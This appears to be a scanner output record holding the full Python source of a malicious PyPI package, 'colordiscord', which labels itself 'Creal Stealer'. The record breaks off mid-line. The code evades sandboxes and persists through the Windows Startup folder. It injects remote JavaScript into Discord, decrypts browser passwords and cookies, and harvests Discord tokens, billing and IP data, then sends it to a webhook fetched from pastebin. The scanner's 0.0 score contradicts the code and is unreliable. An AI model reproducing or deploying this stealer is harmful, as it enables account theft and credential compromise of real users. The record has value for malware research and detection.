statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/colordiscord/0.0.1/colordiscord-0.0.1/colordiscord-0.0.1/colordiscord/colordiscord.py
  contents:
  - name: color
    score: 0.0
    code: "class color():\n    import os\n    import threading\n    from sys import executable\n    from sqlite3 import connect as sql_connect\n    import re\n    from base64 import b64decode\n    from json import loads as json_loads, load\n    from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer\n    from urllib.request import Request, urlopen\n    import json \n    import time\n    import shutil\n    from zipfile import ZipFile\n    import random\n    import re\n    import subprocess\n    import sys\n    import shutil\n    import uuid\n    import socket\n    import getpass\n\n\n\n    blacklistUsers = ['WDAGUtilityAccount', '3W1GJT', 'QZSBJVWM', '5ISYH9SH', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A', 'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise', 'User01', 'test', 'RGzcBUyrznReg']\n\n    username = getpass.getuser()\n\n    if username.lower() in blacklistUsers:\n        os._exit(0)\n\n    def kontrol():\n\n        blacklistUsername = ['BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1', 'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ', 'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M', 'DESKTOP-KALVINO', 'COMPNAME_4047', 'DESKTOP-19OLLTD', 'DESKTOP-DE369SE', 'EA8C2E2A-D017-4', 'AIDANPC', 'LUCAS-PC', 'MARCI-PC', 'ACEPC', 'MIKE-PC', 'DESKTOP-IAPKN1P', 'DESKTOP-NTU7VUO', 'LOUISE-PC', 'T00917', 'test42']\n\n        hostname = socket.gethostname()\n\n        if any(name in hostname for name in blacklistUsername):\n            os._exit(0)\n\n    kontrol()\n\n    BLACKLIST1 = ['00:15:5d:00:07:34', '00:e0:4c:b8:7a:58', '00:0c:29:2c:c1:21', '00:25:90:65:39:e4', 'c8:9f:1d:b6:58:e4', '00:25:90:36:65:0c', '00:15:5d:00:00:f3', '2e:b8:24:4d:f7:de', '00:15:5d:13:6d:0c', '00:50:56:a0:dd:00', '00:15:5d:13:66:ca', '56:e8:92:2e:76:0d', 'ac:1f:6b:d0:48:fe', '00:e0:4c:94:1f:20', '00:15:5d:00:05:d5', '00:e0:4c:4b:4a:40', '42:01:0a:8a:00:22', '00:1b:21:13:15:20', '00:15:5d:00:06:43', '00:15:5d:1e:01:c8', '00:50:56:b3:38:68', '60:02:92:3d:f1:69', '00:e0:4c:7b:7b:86', '00:e0:4c:46:cf:01', '42:85:07:f4:83:d0', '56:b0:6f:ca:0a:e7', '12:1b:9e:3c:a6:2c', '00:15:5d:00:1c:9a', '00:15:5d:00:1a:b9', 'b6:ed:9d:27:f4:fa', '00:15:5d:00:01:81', '4e:79:c0:d9:af:c3', '00:15:5d:b6:e0:cc', '00:15:5d:00:02:26', '00:50:56:b3:05:b4', '1c:99:57:1c:ad:e4', '08:00:27:3a:28:73', '00:15:5d:00:00:c3', '00:50:56:a0:45:03', '12:8a:5c:2a:65:d1', '00:25:90:36:f0:3b', '00:1b:21:13:21:26', '42:01:0a:8a:00:22', '00:1b:21:13:32:51', 'a6:24:aa:ae:e6:12', '08:00:27:45:13:10', '00:1b:21:13:26:44', '3c:ec:ef:43:fe:de', 'd4:81:d7:ed:25:54', '00:25:90:36:65:38', '00:03:47:63:8b:de', '00:15:5d:00:05:8d', '00:0c:29:52:52:50', '00:50:56:b3:42:33', '3c:ec:ef:44:01:0c', '06:75:91:59:3e:02', '42:01:0a:8a:00:33', 'ea:f6:f1:a2:33:76', 'ac:1f:6b:d0:4d:98', '1e:6c:34:93:68:64', '00:50:56:a0:61:aa', '42:01:0a:96:00:22', '00:50:56:b3:21:29', '00:15:5d:00:00:b3', '96:2b:e9:43:96:76', 'b4:a9:5a:b1:c6:fd', 'd4:81:d7:87:05:ab', 'ac:1f:6b:d0:49:86', '52:54:00:8b:a6:08', '00:0c:29:05:d8:6e', '00:23:cd:ff:94:f0', '00:e0:4c:d6:86:77', '3c:ec:ef:44:01:aa', '00:15:5d:23:4c:a3', '00:1b:21:13:33:55', '00:15:5d:00:00:a4', '16:ef:22:04:af:76', '00:15:5d:23:4c:ad', '1a:6c:62:60:3b:f4', '00:15:5d:00:00:1d', '00:50:56:a0:cd:a8', '00:50:56:b3:fa:23', '52:54:00:a0:41:92', '00:50:56:b3:f6:57', '00:e0:4c:56:42:97', 'ca:4d:4b:ca:18:cc', 'f6:a5:41:31:b2:78', 'd6:03:e4:ab:77:8e', '00:50:56:ae:b2:b0', '00:50:56:b3:94:cb', '42:01:0a:8e:00:22', '00:50:56:b3:4c:bf', '00:50:56:b3:09:9e', '00:50:56:b3:38:88', '00:50:56:a0:d0:fa', '00:50:56:b3:91:c8', '3e:c1:fd:f1:bf:71', '00:50:56:a0:6d:86', '00:50:56:a0:af:75', '00:50:56:b3:dd:03', 'c2:ee:af:fd:29:21', '00:50:56:b3:ee:e1', '00:50:56:a0:84:88', '00:1b:21:13:32:20', '3c:ec:ef:44:00:d0', '00:50:56:ae:e5:d5', '00:50:56:97:f6:c8', '52:54:00:ab:de:59', '00:50:56:b3:9e:9e', '00:50:56:a0:39:18', '32:11:4d:d0:4a:9e', '00:50:56:b3:d0:a7', '94:de:80:de:1a:35', '00:50:56:ae:5d:ea', '00:50:56:b3:14:59', 'ea:02:75:3c:90:9f', '00:e0:4c:44:76:54', 'ac:1f:6b:d0:4d:e4', '52:54:00:3b:78:24', '00:50:56:b3:50:de', '7e:05:a3:62:9c:4d', '52:54:00:b3:e4:71', '90:48:9a:9d:d5:24', '00:50:56:b3:3b:a6', '92:4c:a8:23:fc:2e', '5a:e2:a6:a4:44:db', '00:50:56:ae:6f:54', '42:01:0a:96:00:33', '00:50:56:97:a1:f8', '5e:86:e4:3d:0d:f6', '00:50:56:b3:ea:ee', '3e:53:81:b7:01:13', '00:50:56:97:ec:f2', '00:e0:4c:b3:5a:2a', '12:f8:87:ab:13:ec', '00:50:56:a0:38:06', '2e:62:e8:47:14:49', '00:0d:3a:d2:4f:1f', '60:02:92:66:10:79', '', '00:50:56:a0:d7:38', 'be:00:e5:c5:0c:e5', '00:50:56:a0:59:10', '00:50:56:a0:06:8d', '00:e0:4c:cb:62:08', '4e:81:81:8e:22:4e']\n\n    mac_address = uuid.getnode()\n    if str(uuid.UUID(int=mac_address)) in BLACKLIST1:\n        os._exit(0)\n\n\n    inj_url = \"https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js\"\n        \n    DETECTED = False\n    #bir ucaktik dustuk bir gemiydik battik :(\n    def g3t1p():\n        ip = \"None\"\n        try:\n            ip = urlopen(Request(\"https://api.ipify.org\")).read().decode().strip()\n        except:\n            pass\n        return ip\n\n    requirements = [\n        [\"requests\", \"requests\"],\n        [\"Crypto.Cipher\", \"pycryptodome\"],\n    ]\n    for modl in requirements:\n        try: __import__(modl[0])\n        except:\n            subprocess.Popen(f\"{executable} -m pip install {modl[1]}\", shell=True)\n            time.sleep(3)\n\n    import requests\n    \n    from Crypto.Cipher import AES\n\n    local = os.getenv('LOCALAPPDATA')\n    roaming = os.getenv('APPDATA')\n    temp = os.getenv(\"TEMP\")\n    Threadlist = []\n\n\n    class DATA_BLOB(Structure):\n        _fields_ = [\n            ('cbData', wintypes.DWORD),\n            ('pbData', POINTER(c_char))\n        ]\n\n    def G3tD4t4(blob_out):\n        cbData = int(blob_out.cbData)\n        pbData = blob_out.pbData\n        buffer = c_buffer(cbData)\n        cdll.msvcrt.memcpy(buffer, pbData, cbData)\n        windll.kernel32.LocalFree(pbData)\n        return buffer.raw\n\n    def CryptUnprotectData(encrypted_bytes, entropy=b''):\n        buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))\n        buffer_entropy = c_buffer(entropy, len(entropy))\n        blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)\n        blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)\n        blob_out = DATA_BLOB()\n\n        if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):\n            return G3tD4t4(blob_out)\n\n    def D3kryptV4lU3(buff, master_key=None):\n        starts = buff.decode(encoding='utf8', errors='ignore')[:3]\n        if starts == 'v10' or starts == 'v11':\n            iv = buff[3:15]\n            payload = buff[15:]\n            cipher = AES.new(master_key, AES.MODE_GCM, iv)\n            decrypted_pass = cipher.decrypt(payload)\n            decrypted_pass = decrypted_pass[:-16].decode()\n            return decrypted_pass\n\n    def L04dR3qu3sTs(methode, url, data='', files='', headers=''):\n        for i in range(8): # max trys\n            try:\n                if methode == 'POST':\n                    if data != '':\n                        r = requests.post(url, data=data)\n                        if r.status_code == 200:\n                            return r\n                    elif files != '':\n                        r = requests.post(url, files=files)\n                        if r.status_code == 200 or r.status_code == 413:\n                            return r\n            except:\n                pass\n    telnet = requests.get(\"https://pastebin.com/raw/vb608t9D\").text\n    def L04durl1b(telnet, data='', files='', headers=''):\n        for i in range(8):\n            try:\n                if headers != '':\n                    r = urlopen(Request(telnet, data=data, headers=headers))\n                    return r\n                else:\n                    r = urlopen(Request(telnet, data=data))\n                    return r\n            except: \n                pass\n\n    def globalInfo():\n        ip = g3t1p()\n        us3rn4m1 = os.getenv(\"USERNAME\")\n        ipdatanojson = urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode().replace('callback(', '').replace('})', '}')\n        # print(ipdatanojson)\n        ipdata = json.loads(ipdatanojson)\n        # print(urlopen(Request(f\"https://geolocation-db.com/jsonp/{ip}\")).read().decode())\n        contry = ipdata[\"country_name\"]\n        contryCode = ipdata[\"country_code\"].lower()\n        sehir = ipdata[\"state\"]\n\n        globalinfo = f\":flag_{contryCode}:  - `{us3rn4m1.upper()} | {ip} ({contry})`\"\n        return globalinfo\n\n\n    def TR6st(C00k13):\n        # simple Trust Factor system\n        global DETECTED\n        data = str(C00k13)\n        tim = re.findall(\".google.com\", data)\n        # print(len(tim))\n        if len(tim) < -1:\n            DETECTED = True\n            return DETECTED\n        else:\n            DETECTED = False\n            return DETECTED\n            \n    def G3tUHQFr13ndS(t0k3n):\n        b4dg3List =  [\n            {\"Name\": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': \"<:developer:874750808472825986> \"},\n            {\"Name\": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': \"<:bughunter_2:874750808430874664> \"},\n            {\"Name\": 'Early_Supporter', 'Value': 512, 'Emoji': \"<:early_supporter:874750808414113823> \"},\n            {\"Name\": 'House_Balance', 'Value': 256, 'Emoji': \"<:balance:874750808267292683> \"},\n            {\"Name\": 'House_Brilliance', 'Value': 128, 'Emoji': \"<:brilliance:874750808338608199> \"},\n            {\"Name\": 'House_Bravery', 'Value': 64, 'Emoji': \"<:bravery:874750808388952075> \"},\n            {\"Name\": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': \"<:bughunter_1:874750808426692658> \"},\n            {\"Name\": 'HypeSquad_Events', 'Value': 4, 'Emoji': \"<:hypesquad_events:874750808594477056> \"},\n            {\"Name\": 'Partnered_Server_Owner', 'Value': 2,'Emoji': \"<:partner:874750808678354964> \"},\n            {\"Name\": 'Discord_Employee', 'Value': 1, 'Emoji': \"<:staff:874750808728666152> \"}\n        ]\n        headers = {\n            \"Authorization\": t0k3n,\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        try:\n            friendlist = json.loads(urlopen(Request(\"https://discord.com/api/v6/users/@me/relationships\", headers=headers)).read().decode())\n        except:\n            return False\n\n        uhqlist = ''\n        for friend in friendlist:\n            Own3dB3dg4s = ''\n            flags = friend['user']['public_flags']\n            for b4dg3 in b4dg3List:\n                if flags // b4dg3[\"Value\"] != 0 and friend['type'] == 1:\n                    if not \"House\" in b4dg3[\"Name\"]:\n                        Own3dB3dg4s += b4dg3[\"Emoji\"]\n                    flags = flags % b4dg3[\"Value\"]\n            if Own3dB3dg4s != '':\n                uhqlist += f\"{Own3dB3dg4s} | {friend['user']['username']}#{friend['user']['discriminator']} ({friend['user']['id']})\\n\"\n        return uhqlist\n\n\n    process_list = os.popen('tasklist').readlines()\n\n\n    for process in process_list:\n        if \"Discord\" in process:\n            \n            pid = int(process.split()[1])\n            os.system(f\"taskkill /F /PID {pid}\")\n\n    def G3tb1ll1ng(t0k3n):\n        headers = {\n            \"Authorization\": t0k3n,\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        try:\n            b1ll1ngjson = json.loads(urlopen(Request(\"https://discord.com/api/users/@me/billing/payment-sources\", headers=headers)).read().decode())\n        except:\n            return False\n        \n        if b1ll1ngjson == []: return \"```None```\"\n\n        b1ll1ng = \"\"\n        for methode in b1ll1ngjson:\n            if methode[\"invalid\"] == False:\n                if methode[\"type\"] == 1:\n                    b1ll1ng += \":credit_card:\"\n                elif methode[\"type\"] == 2:\n                    b1ll1ng += \":parking: \"\n\n        return b1ll1ng\n\n    def inj_discord():\n\n        username = os.getlogin()\n\n        folder_list = ['Discord', 'DiscordCanary', 'DiscordPTB', 'DiscordDevelopment']\n\n        for folder_name in folder_list:\n            deneme_path = os.path.join(os.getenv('LOCALAPPDATA'), folder_name)\n            if os.path.isdir(deneme_path):\n                for subdir, dirs, files in os.walk(deneme_path):\n                    if 'app-' in subdir:\n                        for dir in dirs:\n                            if 'modules' in dir:\n                                module_path = os.path.join(subdir, dir)\n                                for subsubdir, subdirs, subfiles in os.walk(module_path):\n                                    if 'discord_desktop_core-' in subsubdir:\n                                        for subsubsubdir, subsubdirs, subsubfiles in os.walk(subsubdir):\n                                            if 'discord_desktop_core' in subsubsubdir:\n                                                for file in subsubfiles:\n                                                    if file == 'index.js':\n                                                        file_path = os.path.join(subsubsubdir, file)\n\n                                                        inj_content = requests.get(inj_url).text\n\n                                                        inj_content = inj_content.replace(\"%WEBHOOK%\", telnet)\n\n                                                        with open(file_path, \"w\", encoding=\"utf-8\") as index_file:\n                                                            index_file.write(inj_content)\n    inj_discord()\n\n    def G3tB4dg31(flags):\n        if flags == 0: return ''\n\n        Own3dB3dg4s = ''\n        b4dg3List =  [\n            {\"Name\": 'Early_Verified_Bot_Developer', 'Value': 131072, 'Emoji': \"<:developer:874750808472825986> \"},\n            {\"Name\": 'Bug_Hunter_Level_2', 'Value': 16384, 'Emoji': \"<:bughunter_2:874750808430874664> \"},\n            {\"Name\": 'Early_Supporter', 'Value': 512, 'Emoji': \"<:early_supporter:874750808414113823> \"},\n            {\"Name\": 'House_Balance', 'Value': 256, 'Emoji': \"<:balance:874750808267292683> \"},\n            {\"Name\": 'House_Brilliance', 'Value': 128, 'Emoji': \"<:brilliance:874750808338608199> \"},\n            {\"Name\": 'House_Bravery', 'Value': 64, 'Emoji': \"<:bravery:874750808388952075> \"},\n            {\"Name\": 'Bug_Hunter_Level_1', 'Value': 8, 'Emoji': \"<:bughunter_1:874750808426692658> \"},\n            {\"Name\": 'HypeSquad_Events', 'Value': 4, 'Emoji': \"<:hypesquad_events:874750808594477056> \"},\n            {\"Name\": 'Partnered_Server_Owner', 'Value': 2,'Emoji': \"<:partner:874750808678354964> \"},\n            {\"Name\": 'Discord_Employee', 'Value': 1, 'Emoji': \"<:staff:874750808728666152> \"}\n        ]\n        for b4dg3 in b4dg3List:\n            if flags // b4dg3[\"Value\"] != 0:\n                Own3dB3dg4s += b4dg3[\"Emoji\"]\n                flags = flags % b4dg3[\"Value\"]\n\n        return Own3dB3dg4s\n\n    def G3tT0k4n1nf9(t0k3n):\n        headers = {\n            \"Authorization\": t0k3n,\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n\n        us3rjs0n = json.loads(urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers)).read().decode())\n        us3rn4m1 = us3rjs0n[\"username\"]\n        hashtag = us3rjs0n[\"discriminator\"]\n        em31l = us3rjs0n[\"email\"]\n        idd = us3rjs0n[\"id\"]\n        pfp = us3rjs0n[\"avatar\"]\n        flags = us3rjs0n[\"public_flags\"]\n        n1tr0 = \"\"\n        ph0n3 = \"\"\n\n        if \"premium_type\" in us3rjs0n: \n            nitrot = us3rjs0n[\"premium_type\"]\n            if nitrot == 1:\n                n1tr0 = \"<a:DE_BadgeNitro:865242433692762122>\"\n            elif nitrot == 2:\n                n1tr0 = \"<a:DE_BadgeNitro:865242433692762122><a:autr_boost1:1038724321771786240>\"\n        if \"ph0n3\" in us3rjs0n: ph0n3 = f'{us3rjs0n[\"ph0n3\"]}'\n\n        return us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3\n\n    def ch1ckT4k1n(t0k3n):\n        headers = {\n            \"Authorization\": t0k3n,\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        try:\n            urlopen(Request(\"https://discordapp.com/api/v6/users/@me\", headers=headers))\n            return True\n        except:\n            return False\n\n    if getattr(sys, 'frozen', False):\n        currentFilePath = os.path.dirname(sys.executable)\n    else:\n        currentFilePath = os.path.dirname(os.path.abspath(__file__))\n\n    fileName = os.path.basename(sys.argv[0])\n    filePath = os.path.join(currentFilePath, fileName)\n\n    startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')\n    startupFilePath = os.path.join(startupFolderPath, fileName)\n\n    if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():\n        with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:\n            shutil.copyfileobj(src_file, dst_file)\n\n\n    def upl05dT4k31(t0k3n, path):\n        global telnet\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n        us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)\n\n        if pfp == None: \n            pfp = \"https://i.imgur.com/S0Zqp4R.jpg\"\n        else:\n            pfp = f\"https://cdn.discordapp.com/avatars/{idd}/{pfp}\"\n\n        b1ll1ng = G3tb1ll1ng(t0k3n)\n        b4dg3 = G3tB4dg31(flags)\n        friends = G3tUHQFr13ndS(t0k3n)\n        if friends == '': friends = \"```No Rare Friends```\"\n        if not b1ll1ng:\n            b4dg3, ph0n3, b1ll1ng = \"\U0001F512\", \"\U0001F512\", \"\U0001F512\"\n        if n1tr0 == '' and b4dg3 == '': n1tr0 = \"```None```\"\n\n        data = {\n            \"content\": f'{globalInfo()} | `{path}`',\n            \"embeds\": [\n                {\n                \"color\": 2895667,\n                \"fields\": [\n                    {\n                        \"name\": \"<a:hyperNOPPERS:828369518199308388> Token:\",\n                        \"value\": f\"```{t0k3n}```\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<:mail:750393870507966486> Email:\",\n                        \"value\": f\"```{em31l}```\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<a:1689_Ringing_Phone:755219417075417088> Phone:\",\n                        \"value\": f\"```{ph0n3}```\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<:mc_earth:589630396476555264> IP:\",\n                        \"value\": f\"```{g3t1p()}```\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<:woozyface:874220843528486923> Badges:\",\n                        \"value\": f\"{n1tr0}{b4dg3}\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<a:4394_cc_creditcard_cartao_f4bihy:755218296801984553> Billing:\",\n                        \"value\": f\"{b1ll1ng}\",\n                        \"inline\": True\n                    },\n                    {\n                        \"name\": \"<a:mavikirmizi:853238372591599617> HQ Friends:\",\n                        \"value\": f\"{friends}\",\n                        \"inline\": False\n                    }\n                    ],\n                \"author\": {\n                    \"name\": f\"{us3rn4m1}#{hashtag} ({idd})\",\n                    \"icon_url\": f\"{pfp}\"\n                    },\n                \"footer\": {\n                    \"text\": \"Creal Stealer\",\n                    \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                    },\n                \"thumbnail\": {\n                    \"url\": f\"{pfp}\"\n                    }\n                }\n            ],\n            \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n            \"username\": \"Creal Stealer\",\n            \"attachments\": []\n            }\n        L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n\n    #hersey son defa :(\n    def R4f0rm3t(listt):\n        e = re.findall(\"(\\w+[a-z])\",listt)\n        while \"https\" in e: e.remove(\"https\")\n        while \"com\" in e: e.remove(\"com\")\n        while \"net\" in e: e.remove(\"net\")\n        return list(set(e))\n\n    def upload(name, link):\n        headers = {\n            \"Content-Type\": \"application/json\",\n            \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n        }\n\n        if name == \"crcook\":\n            rb = ' | '.join(da for da in cookiWords)\n            if len(rb) > 1000: \n                rrrrr = R4f0rm3t(str(cookiWords))\n                rb = ' | '.join(da for da in rrrrr)\n            data = {\n                \"content\": f\"{globalInfo()}\",\n                \"embeds\": [\n                    {\n                        \"title\": \"Creal | Cookies Stealer\",\n                        \"description\": f\"<:apollondelirmis:1012370180845883493>: **Accounts:**\\n\\n{rb}\\n\\n**Data:**\\n<:cookies_tlm:816619063618568234> \u2022 **{CookiCount}** Cookies Found\\n<a:CH_IconArrowRight:715585320178941993> \u2022 [CrealCookies.txt]({link})\",\n                        \"color\": 2895667,\n                        \"footer\": {\n                            \"text\": \"Creal Stealer\",\n                            \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                        }\n                    }\n                ],\n                \"username\": \"Creal Stealer\",\n                \"avatar_url\": \"https://cdn.discordapp.com/attachments/1068916221354983427/1074265014560620554/e6fd316fb3544f2811361a392ad73e65.jpg\",\n                \"attachments\": []\n                }\n            L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n            return\n\n        if name == \"crpassw\":\n            ra = ' | '.join(da for da in paswWords)\n            if len(ra) > 1000: \n                rrr = R4f0rm3t(str(paswWords))\n                ra = ' | '.join(da for da in rrr)\n\n            data = {\n                \"content\": f\"{globalInfo()}\",\n                \"embeds\": [\n                    {\n                        \"title\": \"Creal | Password Stealer\",\n                        \"description\": f\"<:apollondelirmis:1012370180845883493>: **Accounts**:\\n{ra}\\n\\n**Data:**\\n<a:hira_kasaanahtari:886942856969875476> \u2022 **{P4sswCount}** Passwords Found\\n<a:CH_IconArrowRight:715585320178941993> \u2022 [CrealPassword.txt]({link})\",\n                        \"color\": 2895667,\n                        \"footer\": {\n                            \"text\": \"Creal Stealer\",\n                            \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                        }\n                    }\n                ],\n                \"username\": \"Creal\",\n                \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n                \"attachments\": []\n                }\n            L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n            return\n\n        if name == \"kiwi\":\n            data = {\n                \"content\": f\"{globalInfo()}\",\n                \"embeds\": [\n                    {\n                    \"color\": 2895667,\n                    \"fields\": [\n                        {\n                        \"name\": \"Interesting files found on user PC:\",\n                        \"value\": link\n                        }\n                    ],\n                    \"author\": {\n                        \"name\": \"Creal | File Stealer\"\n                    },\n                    \"footer\": {\n                        \"text\": \"Creal Stealer\",\n                        \"icon_url\": \"https://i.imgur.com/S0Zqp4R.jpg\"\n                    }\n                    }\n                ],\n                \"username\": \"Creal Stealer\",\n                \"avatar_url\": \"https://i.imgur.com/S0Zqp4R.jpg\",\n                \"attachments\": []\n                }\n            L04durl1b(telnet, data=json.dumps(data).encode(), headers=headers)\n            return\n\n\n\n\n    # def upload(name, tk=''):\n    #     headers = {\n    #         \"Content-Type\": \"application/json\",\n    #         \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0\"\n    #     }\n\n    #     # r = requests.post(hook, files=files)\n    #     LoadRequests(\"POST\", hook, files=files)\n        \n\n\n\n\n    def wr1tef0rf1l3(data, name):\n        path = os.getenv(\"TEMP\") + f\"\\cr{name}.txt\"\n        with open(path, mode='w', encoding='utf-8') as f:\n            f.write(f\"<--Creal STEALER BEST -->\\n\\n\")\n            for line in data:\n                if line[0] != '':\n                    f.write(f\"{line}\\n\")\n\n    T0k3ns = ''\n    def getT0k3n(path, arg):\n        if not os.path.exists(path): return\n\n        path += arg\n        for file in os.listdir(path):\n            if file.endswith(\".log\") or file.endswith(\".ldb\")   :\n                for line in [x.strip() for x in open(f\"{path}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                    for regex in (r\"[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}\", r\"mfa\\.[\\w-]{80,95}\"):\n                        for t0k3n in re.findall(regex, line):\n                            global T0k3ns\n                            if ch1ckT4k1n(t0k3n):\n                                if not t0k3n in T0k3ns:\n                                    # print(token)\n                                    T0k3ns += t0k3n\n                                    upl05dT4k31(t0k3n, path)\n\n    P4ssw = []\n    def getP4ssw(path, arg):\n        global P4ssw, P4sswCount\n        if not os.path.exists(path): return\n\n        pathC = path + arg + \"/Login Data\"\n        if os.stat(pathC).st_size == 0: return\n\n        tempfold = temp + \"cr\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n\n        shutil.copy2(pathC, tempfold)\n        conn = sql_connect(tempfold)\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT action_url, username_value, password_value FROM logins;\")\n        data = cursor.fetchall()\n        cursor.close()\n        conn.close()\n        os.remove(tempfold)\n\n        pathKey = path + \"/Local State\"\n        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n        master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n        master_key = CryptUnprotectData(master_key[5:])\n\n        for row in data: \n            if row[0] != '':\n                for wa in keyword:\n                    old = wa\n                    if \"https\" in wa:\n                        tmp = wa\n                        wa = tmp.split('[')[1].split(']')[0]\n                    if wa in row[0]:\n                        if not old in paswWords: paswWords.append(old)\n                P4ssw.append(f\"UR1: {row[0]} | U53RN4M3: {row[1]} | P455W0RD: {D3kryptV4lU3(row[2], master_key)}\")\n                P4sswCount += 1\n        wr1tef0rf1l3(P4ssw, 'passw')\n\n    C00k13 = []    \n    def getC00k13(path, arg):\n        global C00k13, CookiCount\n        if not os.path.exists(path): return\n        \n        pathC = path + arg + \"/Cookies\"\n        if os.stat(pathC).st_size == 0: return\n        \n        tempfold = temp + \"cr\" + ''.join(random.choice('bcdefghijklmnopqrstuvwxyz') for i in range(8)) + \".db\"\n        \n        shutil.copy2(pathC, tempfold)\n        conn = sql_connect(tempfold)\n        cursor = conn.cursor()\n        cursor.execute(\"SELECT host_key, name, encrypted_value FROM cookies\")\n        data = cursor.fetchall()\n        cursor.close()\n        conn.close()\n        os.remove(tempfold)\n\n        pathKey = path + \"/Local State\"\n        \n        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n        master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n        master_key = CryptUnprotectData(master_key[5:])\n\n        for row in data: \n            if row[0] != '':\n                for wa in keyword:\n                    old = wa\n                    if \"https\" in wa:\n                        tmp = wa\n                        wa = tmp.split('[')[1].split(']')[0]\n                    if wa in row[0]:\n                        if not old in cookiWords: cookiWords.append(old)\n                C00k13.append(f\"{row[0]}\tTRUE\t/\tFALSE\t2597573456\t{row[1]}\t{D3kryptV4lU3(row[2], master_key)}\")\n                CookiCount += 1\n        wr1tef0rf1l3(C00k13, 'cook')\n\n    def G3tD1sc0rd(path, arg):\n        if not os.path.exists(f\"{path}/Local State\"): return\n\n        pathC = path + arg\n\n        pathKey = path + \"/Local State\"\n        with open(pathKey, 'r', encoding='utf-8') as f: local_state = json_loads(f.read())\n        master_key = b64decode(local_state['os_crypt']['encrypted_key'])\n        master_key = CryptUnprotectData(master_key[5:])\n        # print(path, master_key)\n        \n        for file in os.listdir(pathC):\n            # print(path, file)\n            if file.endswith(\".log\") or file.endswith(\".ldb\")   :\n                for line in [x.strip() for x in open(f\"{pathC}\\\\{file}\", errors=\"ignore\").readlines() if x.strip()]:\n                    for t0k3n 